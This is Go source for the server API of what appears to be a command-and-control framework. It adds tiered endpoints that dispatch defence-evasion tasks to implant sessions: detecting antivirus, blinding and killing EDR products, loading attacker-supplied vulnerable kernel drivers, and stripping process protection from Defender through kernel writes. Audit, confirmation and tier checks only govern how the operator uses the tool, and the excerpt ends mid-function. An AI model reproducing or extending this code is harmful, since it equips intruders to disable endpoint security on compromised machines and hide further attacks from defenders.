package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"toshell/internal/common/avops"
	"toshell/internal/common/features"
	"toshell/internal/common/types"
	"toshell/internal/server/config"
	"toshell/internal/server/drivers"
	"toshell/internal/server/logging"
	"toshell/internal/server/session"
	"toshell/internal/server/task"
)

// ─── 杀软对抗能力分级入口（AV-Ops，v1.4.0 S6 第一批）──────────────────────────
//
// 三个**只增不改**的接口，把既有 6 条链（av_detect / edr_blind / edr_kill / byovd_* /
// ppl_kill / process_kill）收进一个分级、可审计、fail-closed 的入口：
//
//	GET  /api/v1/av-ops                等级目录：这个服务端现在允许做到哪一级
//	GET  /api/v1/sessions/{id}/av-ops  对该会话的逐动作可用性判定（**排障先看这里**）
//	POST /api/v1/sessions/{id}/av-ops  执行：服务端按动作定级 + 七步前置检查 + 审计
//
// 设计约束（每一条都是为了"不要靠发一次试试来判断能不能下发"）：
//
//  1. **既有 6 条链的路由与语义一律不动**：本文件只新增入口，改的都是"新增的判定"，
//     没有改任何既有 handler 的行为（既有路由仍是 L2+ 的直通车，这是刻意的向后兼容；
//     分级入口比它更严 —— 例如 ppl_kill 在分级入口里要求存在 rw 档驱动）。
//  2. **等级只能由动作决定**：请求里的 tier 只用于一致性核对，不符即拒（防"用 L0 绕过确认"）。
//  3. **fail-closed**：未知动作/未知等级/表与实现漂移 → 一律拒绝，绝不"猜一个等级放过去"。
//  4. **下发复用既有链路**：task.Manager 的 Create* + TaskPusher.PushTask，不另造投递。
//  5. **审计**：每个决策（放行/拒绝/超时）都写一条结构化事件；**日志里不出现凭据类内容**
//     （driver_b64 之类只记长度，不记内容）。

// avopsAuditEvent 一条 AV-Ops 审计事件。
//
// 与 moduleAuditEvent 同一思路：日志是给人看的，审计的价值在"可判定"。
// 做成结构体 + 可注入 hook，单测就能直接断言字段，而不是去匹配日志文本。
type avopsAuditEvent struct {
	At        time.Time `json:"at"`
	Event     string    `json:"event"`
	SessionID string    `json:"session_id,omitempty"`
	Action    string    `json:"action,omitempty"`
	Tier      string    `json:"tier,omitempty"`
	TaskID    uint64    `json:"task_id,omitempty"`
	Step      int       `json:"step,omitempty"`
	Code      string    `json:"code,omitempty"`
	Confirm   bool      `json:"confirm"`
	Detail    string    `json:"detail,omitempty"`
}

// auditAVOps 记录一条 AV-Ops 审计事件（默认写日志；测试可注入 hook 断言）。
//
// ⚠️ 绝不把请求参数（params）写进审计/日志：byovd_load 的 driver_b64 是操作员自备驱动
// 的全部字节，写进日志等于把驱动资产复制到日志文件里。需要留痕时只记长度与名称。
func (s *Server) auditAVOps(ev avopsAuditEvent) {
	if ev.At.IsZero() {
		ev.At = time.Now()
	}
	if s.avopsAuditHook != nil {
		s.avopsAuditHook(ev)
	}
	switch ev.Event {
	case "avops_dispatched":
		logging.Info("avops", "audit event=%s session=%s action=%s tier=%s task=%d confirm=%t",
			ev.Event, ev.SessionID, ev.Action, ev.Tier, ev.TaskID, ev.Confirm)
	case "avops_timeout":
		logging.Warn("avops", "audit event=%s session=%s action=%s tier=%s task=%d detail=%s",
			ev.Event, ev.SessionID, ev.Action, ev.Tier, ev.TaskID, ev.Detail)
	default:
		logging.Warn("avops", "audit event=%s session=%s action=%s tier=%s step=%d code=%s confirm=%t detail=%s",
			ev.Event, ev.SessionID, ev.Action, ev.Tier, ev.Step, ev.Code, ev.Confirm, ev.Detail)
	}
}

// avopsPolicy 从**实时配置**解析 AV-Ops 策略。
//
// 为什么每次请求都读 config.Get()：设置/配置文件热更新后应立即生效，缓存快照会让
// "我刚把 allow_l2 打开却还是被拒"变成排查黑洞（webConfig 也是同一口径）。
// 配置缺失时回落到 avops.DefaultPolicy()（L2+ 全关、强制确认）—— **不是**"全开"。
func (s *Server) avopsPolicy() avops.Policy {
	cfg := config.Get()
	if cfg == nil {
		cfg = s.cfg
	}
	if cfg == nil {
		return avops.DefaultPolicy()
	}
	// RequireConfirm 是 *bool：nil（未配置/零值 Config）视为 true（要求确认）。
	skip := false
	if cfg.AVOps.RequireConfirm != nil && !*cfg.AVOps.RequireConfirm {
		skip = true
	}
	return avops.Policy{
		AllowL2:           cfg.AVOps.AllowL2,
		AllowL3:           cfg.AVOps.AllowL3,
		AllowL4:           cfg.AVOps.AllowL4,
		SkipConfirm:       skip,
		DefaultTimeoutSec: cfg.AVOps.DefaultTimeoutSec,
		MaxTimeoutSec:     cfg.AVOps.MaxTimeoutSec,
	}.Normalize()
}

// avopsPolicyView 策略的对外回显（前端要能显示"当前服务端允许到哪一级"）。
type avopsPolicyView struct {
	AllowL2 bool `json:"allow_l2"`
	AllowL3 bool `json:"allow_l3"`
	AllowL4 bool `json:"allow_l4"`
	// RequireConfirm 正向回显（配置键也是正向的 require_confirm）。
	RequireConfirm    bool `json:"require_confirm"`
	DefaultTimeoutSec int  `json:"default_timeout_sec"`
	MaxTimeoutSec     int  `json:"max_timeout_sec"`
}

func avopsPolicyToView(p avops.Policy) avopsPolicyView {
	p = p.Normalize()
	return avopsPolicyView{
		AllowL2: p.AllowL2, AllowL3: p.AllowL3, AllowL4: p.AllowL4,
		RequireConfirm:    !p.SkipConfirm,
		DefaultTimeoutSec: p.DefaultTimeoutSec,
		MaxTimeoutSec:     p.MaxTimeoutSec,
	}
}

// avopsCheck 一步前置检查的结论（回传给调用方，便于"哪一步没过"一目了然）。
type avopsCheck struct {
	Step   int    `json:"step"`
	Name   string `json:"name"`
	OK     bool   `json:"ok"`
	Code   string `json:"code,omitempty"`
	Detail string `json:"detail,omitempty"`
}

// avopsTierView 等级目录里的一项（元数据 + 该级动作 + 当前配置下是否允许）。
type avopsTierView struct {
	avops.TierMeta
	Allowed bool `json:"allowed"`
	// DeniedReason 不允许时的人类可读原因（allowed=true 时为空）。
	DeniedReason string `json:"denied_reason,omitempty"`
	// ActionCount / Actions 该级包含的动作清单（只列**已实现**的动作）。
	ActionCount int            `json:"action_count"`
	Actions     []avops.Action `json:"actions"`
}

// avopsNotes 等级目录里的全局说明（前端/脚本可直接展示）。
//
// 写在这里而不是散在注释里：这些是"操作员必须知道的口径"，接口要能自解释。
var avopsNotes = []string{
	"L0 侦察只读：可以直接下发（av_detect），也可以走既有的只读工具（check_av / system_info）。",
	"L1 起为破坏性动作：必须 confirm=true，且**不参与服务端任何自动重投递**（重发=再执行）。",
	"L2/L3/L4 默认关闭（configs 的 avops.allow_l2 / allow_l3 / allow_l4）：默认配置下它们一律不可用。",
	"L3 的驱动仍由操作员自备、项目不内置；没有对应档位的驱动时入口会明确拒绝，而不是让你试一下。",
	"L4 当前没有落地动作（allow_l4=true 也不会让任何动作变成可下发）—— 见 GET 响应的 tiers 里 L4 的 note。",
	"Agent/MCP 工具面**不暴露**本入口的任何 L1+ 动作；只有 L0 侦察走既有只读工具。",
}

// listAVOpsHandler GET /api/v1/av-ops
//
// 返回等级目录：每级元数据 + 该级动作清单 + 当前配置下是否允许执行 + 不允许的原因。
// 这是给前端/脚本看的"这个服务端现在允许做到哪一级"，也是"要不要给按钮"的依据。
func (s *Server) listAVOpsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	p := s.avopsPolicy()

	tiers := make([]avopsTierView, 0, len(avops.Tiers()))
	total := 0
	for _, meta := range avops.Tiers() {
		allowed, reason := p.TierAllowed(meta.Tier)
		acts := avops.ActionsOfTier(meta.Tier)
		if acts == nil {
			acts = []avops.Action{}
		}
		total += len(acts)
		tiers = append(tiers, avopsTierView{
			TierMeta: meta, Allowed: allowed, DeniedReason: reason,
			ActionCount: len(acts), Actions: acts,
		})
	}

	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"ok":           true,
		"policy":       avopsPolicyToView(p),
		"tiers":        tiers,
		"action_count": total,
		"notes":        avopsNotes,
		// 供脚本快速判断（也是"排障先看这里"的入口提示）
		"probe_hint": "要看某个会话能不能执行某动作，请用 GET /api/v1/sessions/{id}/av-ops（逐动作给 allowed + reasons）",
	})
}

// avopsSessionState 一次会话级判定的输入快照。
type avopsSessionState struct {
	Sess     *session.Session
	Features []string
	Source   features.Source
	Active   bool
}

// avopsSessionStateOf 取会话快照 + 解析能力位（能力位判定复用 features.Resolve，不另造）。
//
// 返回错误时调用方已经知道该怎么回（avops.CodeSessionNotFound → 404 等）。
func (s *Server) avopsSessionStateOf(id string) (*avopsSessionState, error) {
	if s.sessionMgr == nil {
		return &avopsSessionState{Active: true, Source: features.SourceOSFallback}, nil
	}
	sess, err := s.sessionMgr.Get(id)
	if err != nil || sess == nil || sess.Info == nil {
		return nil, avops.NewError(404, avops.CodeSessionNotFound, "会话 %s 不存在（可能已下线并被清理）", id)
	}
	featureList, _, source := features.Resolve(sess.Info.ActiveModules, sess.Info.OS)
	active := strings.EqualFold(sess.Info.Status, "active") || sess.IsAlive()
	return &avopsSessionState{Sess: sess, Features: featureList, Source: source, Active: active}, nil
}

// avopsDriverSnapshot 驱动档位摘要（便宜路径；见 drivers.ProfileSummary 的性能说明）。
func avopsDriverSnapshot() drivers.ProfileSummary { return drivers.Summary() }

// avopsDriverPlan L3 动作解析出的驱动用法（byovd_kill 还需要 device/ioctl）。
type avopsDriverPlan struct {
	Device string
	IOCTL  uint32
	Name   string
	Detail string
	// Warnings 加载前自检的警告（未签名、可能被黑名单拦截等）：不阻断下发，但必须回显。
	Warnings []string
}

// avopsDriverPlanOf L3 类动作的驱动前置检查（第 ⑥ 步）。
//
// 规则（全部 fail-closed，宁可拒绝也不让操作员"试一下"）：
//   - byovd_load   ：驱动字节随请求携带（driver_b64）+ service_name 必填 → 有；
//   - byovd_unload ：service_name 必填（服务名即"操作员自备驱动"的标识）→ 有；
//   - byovd_kill   ：device+ioctl 请求显式给 → 本会话已登记（byovd_load 登记过）
//     → driver 参数按名字查档 → 目录里存在 kill/both 档 → 都没有则拒绝；
//   - ppl_kill     ：必须有 rw（或 both）档驱动，没有就明确说"无 rw 档驱动，不可用"。
func (s *Server) avopsDriverPlanOf(id string, a avops.Action, params map[string]interface{}) (avopsDriverPlan, error) {
	return s.avopsDriverPlanWith(avopsDriverSnapshot(), id, a, params)
}

// avopsDriverPlanWith 与 avopsDriverPlanOf 同一套规则，但复用调用方已经取好的档位摘要：
// GET /sessions/{id}/av-ops 要对多个动作逐个判定，若每个动作都重扫一遍驱动目录，
// 一个请求就会做 4~5 次目录遍历 + manifest 解析（虽然便宜，但没必要）。
func (s *Server) avopsDriverPlanWith(sum drivers.ProfileSummary, id string, a avops.Action, params map[string]interface{}) (avopsDriverPlan, error) {
	switch a.Name {
	case "byovd_load":
		raw := avops.ParamString(params, "driver_b64")
		if raw == "" {
			return avopsDriverPlan{}, avops.NewError(409, avops.CodeDriverUnavailable,
				"未提供操作员自备驱动：params.driver_b64 为空。本入口不内置任何驱动，"+
					"请把 .sys 的 base64 内容放进请求（或先放到 data/drivers/ 并用 GET /api/v1/drivers 确认）")
		}
		svc := avops.ParamString(params, "service_name")
		// name 是驱动档案名（用于在 manifest.json 里找期望 sha256 / 声明签名者）：
		// 与既有 byovd_load 路由的 req.Name 同一用途，缺省时自检只能给"未声明哈希"的警告。
		name := avops.ParamString(params, "name")
		blob, err := base64.StdEncoding.DecodeString(raw)
		if err != nil {
			return avopsDriverPlan{}, avops.NewError(400, avops.CodeParamsInvalid,
				"params.driver_b64 不是合法 base64：%v", err)
		}
		// **加载前自检**：与既有 byovd_load 路由同一口径（ROADMAP P0-1）——
		// 有 Errors（典型：上传的 .sys 与 manifest 声明的 sha256 不一致，说明被替换/损坏）
		// 一律拒绝下发；只有 Warnings（未签名、可能被 HVCI/黑名单静默拒绝）才允许继续。
		// 漏掉这一步等于分级入口成了"绕过自检的后门"，所以这里刻意重跑一次。
		verify := drivers.VerifyBytes(name, blob)
		if len(verify.Errors) > 0 {
			return avopsDriverPlan{}, avops.NewError(400, avops.CodeDriverSelfcheckFailed,
				"驱动自检未通过，已拒绝下发（与既有 byovd_load 路由同一口径）：%s",
				strings.Join(verify.Errors, "；"))
		}
		return avopsDriverPlan{
			Name: svc, Warnings: verify.Warnings,
			Detail: fmt.Sprintf("操作员自备驱动随请求携带并通过加载前自检（service_name=%s，%d 字节，%s）",
				svc, len(blob), verify.Summary()),
		}, nil

	case "byovd_unload":
		svc := avops.ParamString(params, "service_name")
		if svc == "" {
			return avopsDriverPlan{}, avops.NewError(400, avops.CodeParamsInvalid, "params.service_name 必填（要卸载哪个驱动服务）")
		}
		return avopsDriverPlan{Name: svc, Detail: fmt.Sprintf("卸载内核服务 %s（由操作员指定服务名）", svc)}, nil

	case "byovd_kill":
		device := avops.ParamString(params, "device")
		ioctl := parseIOCTLValue(params["ioctl"])
		name := ""
		if device != "" && ioctl != 0 {
			return avopsDriverPlan{Device: device, IOCTL: ioctl}.normalize(
				fmt.Sprintf("使用请求显式指定的驱动：device=%s ioctl=0x%06X", device, ioctl)), nil
		}
		// 本会话此前 byovd_load 登记过的档案（与既有 byovd_kill 路径同一来源）
		if d, ok := s.recallSessionDriver(id); ok {
			device, ioctl, name = d.Device, d.IOCTL, d.Name
		}
		// 请求按名字点名驱动档案
		if device == "" || ioctl == 0 {
			if want := avops.ParamString(params, "driver"); want != "" {
				d, ok := sum.FindMeta(want)
				if !ok {
					return avopsDriverPlan{}, avops.NewError(409, avops.CodeDriverUnavailable,
						"未找到驱动档案 %q：请先用 GET /api/v1/drivers 看有哪些（.sys 放到 %s）",
						want, strings.Join(sum.SearchDirs, " 或 "))
				}
				device, ioctl, name = d.Device, d.IOCTL, d.Name
			}
		}
		// 目录里第一个 kill/both 档
		if (device == "" || ioctl == 0) && sum.Kill != nil {
			device, ioctl, name = sum.Kill.Device, sum.Kill.IOCTL, sum.Kill.Name
		}
		if device == "" || ioctl == 0 {
			return avopsDriverPlan{}, avops.NewError(409, avops.CodeDriverUnavailable,
				"无可用驱动档案：请在 params 里直接给 device+ioctl，或先 byovd_load 登记，"+
					"或把带 device/ioctl 的 manifest.json 放进 %s（当前目录里 %d 个 .sys，档位 %v）",
				strings.Join(sum.SearchDirs, " 或 "), sum.Total, sum.Purposes)
		}
		return avopsDriverPlan{Device: device, IOCTL: ioctl, Name: name,
			Detail: fmt.Sprintf("使用驱动 %s：device=%s ioctl=0x%06X", name, device, ioctl)}, nil

	case "ppl_kill":
		if sum.RW == nil {
			return avopsDriverPlan{}, avops.NewError(409, avops.CodeDriverUnavailable,
				"无 rw 档驱动，PPL 清除不可用：PPL 保护进程（Defender MsMpEng 等）需要具备内核读写的"+
					"驱动去改 EPROCESS.Protection；目录 %s 里当前 %d 个 .sys，档位 %v。"+
					"（既有 /edr/ppl-kill 路由仍可走句柄窃取路线，但对 PPL 进程通常失败 —— 本分级入口"+
					"刻意不让你「试一下」）",
				strings.Join(sum.SearchDirs, " 或 "), sum.Total, sum.Purposes)
		}
		return avopsDriverPlan{Name: sum.RW.Name, Device: sum.RW.Device,
			Detail: fmt.Sprintf("使用 rw 档驱动 %s（purpose=%s）", sum.RW.Name, sum.RW.Purpose)}, nil
	}
	return avopsDriverPlan{}, nil
}

// normalize 把 Detail 填上并返回自身（让上面的构造点保持一行）。
func (p avopsDriverPlan) normalize(detail string) avopsDriverPlan {
	p.Detail = detail
	return p
}

// avopsReasons 计算某动作在本会话/本配置下的**全部**阻塞原因（供 GET 逐动作回显）。
//
// 与 POST 的顺序检查是"同一批规则、两种呈现"：POST 遇错即停（并回传已完成的步骤），
// GET 要一次列全（排障时操作员最烦"修一个冒一个"）。规则本身仍只写在 avops 包里。
//
// 关于 L3 驱动的呈现口径（刻意不对称，别当成漏写）：
//   - byovd_load / byovd_unload 的驱动**随请求携带**（driver_b64 / service_name），
//     预览阶段无从判断 → 不加阻塞原因，只在响应顶层的 driver 块里给出本机档位现状；
//   - byovd_kill / ppl_kill 依赖**本机已有**的驱动档位（kill / rw），预览阶段即可判定
//     → 按真实情况给出 blocking reason（"无 rw 档驱动，不可用"就在这里）。
func (s *Server) avopsReasons(st *avopsSessionState, a avops.Action, p avops.Policy, sum drivers.ProfileSummary) []map[string]string {
	var reasons []map[string]string
	add := func(code, msg string) {
		reasons = append(reasons, map[string]string{"code": code, "message": msg})
	}

	if !st.Active {
		add(avops.CodeSessionInactive,
			"会话不在线（status="+sessionStatusOf(st)+"）：下发需要 active 会话，否则任务只会挂在队列里")
	}
	if allowed, reason := p.TierAllowed(a.Tier); !allowed {
		add(avops.CodeTierDisabled, reason)
	}
	if a.NeedsConfirm && !p.SkipConfirm {
		add(avops.CodeConfirmationRequired, "下发时必须带 confirm=true（该等级需要二次确认）")
	}
	if err := avops.CheckCapability(a, st.Features, string(st.Source)); err != nil {
		add(avops.ErrorCode(err), avops.ErrorMessage(err))
	}
	switch a.Name {
	case "byovd_kill", "ppl_kill":
		if _, err := s.avopsDriverPlanWith(sum, sessionIDOf(st), a, nil); err != nil {
			msg := avops.ErrorMessage(err)
			if a.Name == "byovd_kill" {
				// 请求里显式给 device+ioctl 时不依赖本机档案，必须说清楚，
				// 否则操作员会以为这个动作完全不可用。
				msg += "（若你在 params 里显式给出 device+ioctl，本动作不依赖本机驱动档案）"
			}
			add(avops.ErrorCode(err), msg)
		}
	}
	return reasons
}

// sessionStatusOf 取会话状态文案（会话缺失时给空串，不回显内部细节）。
func sessionStatusOf(st *avopsSessionState) string {
	if st == nil || st.Sess == nil || st.Sess.Info == nil {
		return ""
	}
	return st.Sess.Info.Status
}

// sessionIDOf 取会话 id。
func sessionIDOf(st *avopsSessionState) string {
	if st == nil || st.Sess == nil || st.Sess.Info == nil {
		return ""
	}
	return st.Sess.Info.ID
}

// sessionAVOpsHandler GET /api/v1/sessions/{id}/av-ops
//
// 返回"对这个会话"的可用性判定：逐动作给 allowed + reasons[]。
// **排障先看这里**：不要靠"发一次试试"来判断能不能下发（那正是要消灭的行为）。
func (s *Server) sessionAVOpsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	id := sessionIDFromPath(r)
	// 会话不存在 → 404（复用全项目同一口径的 helper，不自己再写一套）
	if !s.requireSessionFromPath(w, r) {
		return
	}
	st, err := s.avopsSessionStateOf(id)
	if err != nil {
		writeAVOpsError(w, err, nil)
		return
	}
	p := s.avopsPolicy()
	sum := avopsDriverSnapshot()

	type actionView struct {
		avops.Action
		TierName string              `json:"tier_name"`
		Allowed  bool                `json:"allowed"`
		Reasons  []map[string]string `json:"reasons"`
	}
	views := make([]actionView, 0, len(avops.Actions()))
	allowedN := 0
	for _, a := range avops.Actions() {
		reasons := s.avopsReasons(st, a, p, sum)
		if reasons == nil {
			reasons = []map[string]string{}
		}
		ok := len(reasons) == 0
		if ok {
			allowedN++
		}
		views = append(views, actionView{Action: a, TierName: a.Meta().Name, Allowed: ok, Reasons: reasons})
	}

	resp := map[string]interface{}{
		"ok":         true,
		"session_id": id,
		"policy":     avopsPolicyToView(p),
		"actions":    views,
		"summary": map[string]interface{}{
			"allowed": allowedN,
			"blocked": len(views) - allowedN,
			"total":   len(views),
		},
		"driver": map[string]interface{}{
			"kill_available": sum.Kill != nil,
			"rw_available":   sum.RW != nil,
			"total":          sum.Total,
			"purposes":       sum.Purposes,
			"search_dirs":    sum.SearchDirs,
			"note":           "档位判定只看 manifest 声明（便宜路径）；真正的哈希/签名自检在 byovd_load 下发时与 GET /api/v1/drivers/{name}/verify 里做",
		},
		"message": "排障先看这里：allowed=false 的动作在 reasons 里写了确切原因（机器可读 code + 中文说明），不必发一次试试",
	}
	if st.Sess != nil && st.Sess.Info != nil {
		resp["status"] = st.Sess.Info.Status
		resp["os"] = st.Sess.Info.OS
		resp["arch"] = st.Sess.Info.Arch
		resp["features"] = st.Features
		// 能力清单来源：os_fallback 时清单未必等于载荷真实能力，必须显式说明
		resp["capability_source"] = string(st.Source)
		if st.Source == features.SourceOSFallback {
			resp["capability_note"] = features.SourceNote
		}
	}
	_ = json.NewEncoder(w).Encode(resp)
}

// avopsExecRequest POST /api/v1/sessions/{id}/av-ops 的请求体。
type avopsExecRequest struct {
	Action string `json:"action"`
	// Tier 只用于**一致性核对**：与动作实际等级不符即拒绝（防"用低等级绕过确认"）。
	Tier    string                 `json:"tier"`
	Confirm bool                   `json:"confirm"`
	Params  map[string]interface{} `json:"params"`
	// TimeoutSec 显式超时（秒）：0 = 用服务端默认；超过上限**直接拒绝**（不截断）。
	TimeoutSec int `json:"timeout_sec"`
}

// execAVOpsHandler POST /api/v1/sessions/{id}/av-ops
//
// 七步前置检查（① 会话 active ② 动作在表里 + tier 一致 ③ 等级被允许 ④ 确认
// ⑤ 能力位 ⑥ L3 驱动 ⑦ 显式超时）→ 下发（复用既有 task.Manager + TaskPusher）→ 审计。
func (s *Server) execAVOpsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	id := sessionIDFromPath(r)

	body, err := io.ReadAll(io.LimitReader(r.Body, 8<<20)) // byovd_load 要带 .sys 的 base64
	if err != nil {
		writeAVOpsError(w, avops.NewError(400, avops.CodeBadRequest, "读取请求体失败：%v", err), nil)
		return
	}
	var req avopsExecRequest
	if err := json.Unmarshal(body, &req); err != nil {
		writeAVOpsError(w, avops.NewError(400, avops.CodeBadRequest, "请求体不是合法 JSON：%v", err), nil)
		return
	}
	if req.Params == nil {
		req.Params = map[string]interface{}{}
	}
	p := s.avopsPolicy()

	checks := make([]avopsCheck, 0, 9)
	okCheck := func(step int, name, detail string) {
		checks = append(checks, avopsCheck{Step: step, Name: name, OK: true, Detail: detail})
	}
	// reject 统一做三件事：记录失败步骤 → 写审计 → 回 4xx/5xx + 已完成的步骤。
	reject := func(step int, name string, err error) {
		code := avops.ErrorCode(err)
		detail := avops.ErrorMessage(err)
		checks = append(checks, avopsCheck{Step: step, Name: name, OK: false, Code: code, Detail: detail})
		s.auditAVOps(avopsAuditEvent{
			Event: "avops_rejected", SessionID: id, Action: req.Action, Tier: req.Tier,
			Step: step, Code: code, Confirm: req.Confirm, Detail: detail,
		})
		writeAVOpsError(w, err, checks)
	}

	// ── ① 会话存在且 active ────────────────────────────────────────────────
	// 会话不存在 → 404（复用 requireSessionFromPath，与全项目同一口径：
	// `404 {"error":"session not found: <id>"}`）；存在但不在线 → 409 session_inactive。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	st, serr := s.avopsSessionStateOf(id)
	if serr != nil {
		reject(1, "session_active", serr)
		return
	}
	if !st.Active {
		reject(1, "session_active", avops.NewError(409, avops.CodeSessionInactive,
			"会话 %s 状态为 %q：破坏性动作需要一个在线会话（否则任务只会挂在队列里，"+
				"而队列里的破坏性任务不会自动重投递，等于白下一次）", id, sessionStatusOf(st)))
		return
	}
	okCheck(1, "session_active", fmt.Sprintf("会话在线：status=%s os=%s arch=%s",
		sessionStatusOf(st), st.Sess.Info.OS, st.Sess.Info.Arch))

	// ── ② 动作在分级表里 + tier 一致 ───────────────────────────────────────
	a, aerr := avops.CheckAction(req.Action)
	if aerr != nil {
		reject(2, "action_known", aerr)
		return
	}
	if derr := avops.CheckTierField(req.Tier, a); derr != nil {
		reject(2, "tier_consistent", derr)
		return
	}
	okCheck(2, "action_known", fmt.Sprintf("动作 %s 已登记：等级 %s（%s），任务类型 %s，能力位 %s",
		a.Name, a.Tier, a.Meta().Name, a.TaskType, a.Capability))

	// ── ③ 等级被服务端配置允许（L2+ 默认禁用）──────────────────────────────
	if terr := avops.CheckTierAllowed(p, a); terr != nil {
		reject(3, "tier_allowed", terr)
		return
	}
	okCheck(3, "tier_allowed", fmt.Sprintf("等级 %s 已允许（allow_l2=%t allow_l3=%t allow_l4=%t）",
		a.Tier, p.AllowL2, p.AllowL3, p.AllowL4))

	// ── ④ 二次确认 ────────────────────────────────────────────────────────
	if cerr := avops.CheckConfirm(p, a, req.Confirm); cerr != nil {
		reject(4, "confirmed", cerr)
		return
	}
	if a.NeedsConfirm {
		okCheck(4, "confirmed", "已收到显式二次确认（confirm=true）")
	} else {
		okCheck(4, "confirmed", "该动作不需要二次确认（L0 只读）")
	}

	// ── ⑤ 载荷能力位 ──────────────────────────────────────────────────────
	if ferr := avops.CheckCapability(a, st.Features, string(st.Source)); ferr != nil {
		reject(5, "capability", ferr)
		return
	}
	okCheck(5, "capability", fmt.Sprintf("载荷能力位包含 %s（来源=%s）", a.Capability, st.Source))

	// ── ⑥ 参数 + L3 驱动 ──────────────────────────────────────────────────
	if perr := avops.CheckRequiredParams(a, req.Params); perr != nil {
		reject(6, "params", perr)
		return
	}
	plan := avopsDriverPlan{}
	if a.Tier == avops.TierL3 {
		dp, derr := s.avopsDriverPlanOf(id, a, req.Params)
		if derr != nil {
			reject(6, "driver", derr)
			return
		}
		plan = dp
		okCheck(6, "driver", dp.Detail)
	} else {
		okCheck(6, "driver", "该动作不需要内核驱动（非 L3）")
	}

	// 警告在驱动自检之后组装：byovd_load 的"未签名/可能被黑名单拦截"警告就来自第 ⑥ 步。
	warnings := append(avopsWarnings(a, st, p), plan.Warnings...)

	// ── ⑦ 显式超时 ────────────────────────────────────────────────────────
	timeoutSec, terr := p.ResolveTimeout(req.TimeoutSec)
	if terr != nil {
		reject(7, "timeout", terr)
		return
	}
	okCheck(7, "timeout", fmt.Sprintf("显式超时 %d 秒（默认 %d，上限 %d）", timeoutSec, p.DefaultTimeoutSec, p.MaxTimeoutSec))

	// ── ⑧ 下发（复用既有链路：task.Manager 创建 + TaskPusher 推送）─────────
	if !s.requireListener(w) {
		return
	}
	taskInfo, derr := s.avopsDispatch(id, a, req.Params, plan)
	if derr != nil {
		reject(8, "dispatched", derr)
		return
	}
	if perr := s.listener.PushTask(id, taskInfo); perr != nil {
		reject(8, "dispatched", avops.NewError(503, avops.CodePushFailed,
			"任务 %d 已创建但下发失败：%v（任务仍在队列里，可稍后重试心跳取走；"+
				"破坏性任务不会自动重投递，若确认没执行可重新下发并分配新 task_id）", taskInfo.ID, perr))
		return
	}
	okCheck(8, "dispatched", fmt.Sprintf("任务 %d（%s）已下发", taskInfo.ID, taskInfo.TaskType))

	// ── ⑨ 审计 ────────────────────────────────────────────────────────────
	s.auditAVOps(avopsAuditEvent{
		Event: "avops_dispatched", SessionID: id, Action: a.Name, Tier: string(a.Tier),
		TaskID: taskInfo.ID, Confirm: req.Confirm,
		Detail: fmt.Sprintf("task_type=%s timeout=%ds no_auto_retry=%v", taskInfo.TaskType, timeoutSec, !a.AutoRetry),
	})
	okCheck(9, "audited", "已写审计日志（事件=avops_dispatched；不含任何凭据/驱动字节）")

	// 服务端侧显式超时收口（见 task.Manager.Expire 的注释）：
	// 植入端（builder 模板）用的是固定的 90s/180s 执行窗口，**不读** task.Timeout，
	// 所以"把 timeout_sec 塞进任务字段"只会造成"看起来生效其实没有"的假象。
	// 这里用看门狗把超时变成服务端可判定的结论：到点仍无结果 → 置为 timeout（终态）。
	go s.avopsTimeoutWatchdog(id, a, taskInfo.ID, timeoutSec)

	impact := avopsImpactOf(a, req.Params, plan, timeoutSec)
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"ok":        true,
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"action":    a.Name,
		"tier":      a.Tier,
		"tier_name": a.Meta().Name,
		// destructive / confirmed 是给前端做二次确认与风险回显的字段
		"destructive": a.Destructive,
		"confirmed":   a.NeedsConfirm && req.Confirm,
		"auto_retry":  a.AutoRetry,
		"impact":      impact,
		"checks":      checks,
		"warnings":    warnings,
		"message": fmt.Sprintf("已下发 %s（%s）：结果走既有任务结果通道（GET /api/v1/tasks/%d）",
			a.Name, a.Tier, taskInfo.ID),
	})
}

// avopsTimeoutWatchdog 服务端侧显式超时收口。
//
// 为什么必须是服务端看门狗（而不是给植入端任务加个 timeout 字段）：
// 植入端模板的 executeTaskWithTimeout 用的是固定窗口（轻任务 90s / 重活 180s），
// 完全不读 task.Timeout；只有 legacy 的 cmd/implant 会用它。把 timeout_sec 写进
// task.Timeout 会造出"配置看起来生效、实际没有"的哑失败，而这个项目最不缺的就是
// 这类难查的问题。看门狗是唯一能把这个值变成真实行为的落点。
func (s *Server) avopsTimeoutWatchdog(sessionID string, a avops.Action, taskID uint64, timeoutSec int) {
	timer := time.NewTimer(time.Duration(timeoutSec) * time.Second)
	defer timer.Stop()
	<-timer.C
	if s.taskMgr == nil {
		return
	}
	tk, err := s.taskMgr.Get(taskID)
	if err != nil || tk == nil {
		return // 任务已被回收/删除：无需收口
	}
	if task.IsTerminalStatus(tk.Status) {
		return // 已有结论（completed/failed/timeout），谁先到谁说话
	}
	reason := fmt.Sprintf("av-ops 显式超时：%d 秒内未收到结果（动作 %s，等级 %s）", timeoutSec, a.Name, a.Tier)
	if err := s.taskMgr.Expire(taskID, reason); err != nil {
		logging.Warn("avops", "任务 %d 超时收口失败：%v", taskID, err)
		return
	}
	s.auditAVOps(avopsAuditEvent{
		Event: "avops_timeout", SessionID: sessionID, Action: a.Name, Tier: string(a.Tier),
		TaskID: taskID, Code: "timeout", Detail: reason,
	})
}

// avopsDispatch 按动作创建任务（**复用既有 task.Manager 的 Create* 与同一套 TaskType/Data 形状**）。
//
// 为什么不是"自己拼 TaskParams 再 Create"：Data 的 JSON 形状是服务端与植入端之间的契约
// （例如 byovd_kill 的 device/ioctl 字段名、edr_kill 的 processes 数组），既有的 Create*
// 是这些形状的唯一定义处；另写一份 = 迟早与植入端解析漂移，且漂移时表现为"下发成功但植入端报参数错"，
// 极难排查。这里对每个动作逐个复用对应方法，末端的 default 分支 fail-closed。
func (s *Server) avopsDispatch(id string, a avops.Action, params map[string]interface{}, plan avopsDriverPlan) (*types.TaskInfo, error) {
	switch a.Name {
	case "av_detect":
		// L0：既有链没有专用 Create 方法（av_detect 一直走通用 /tasks 接口），
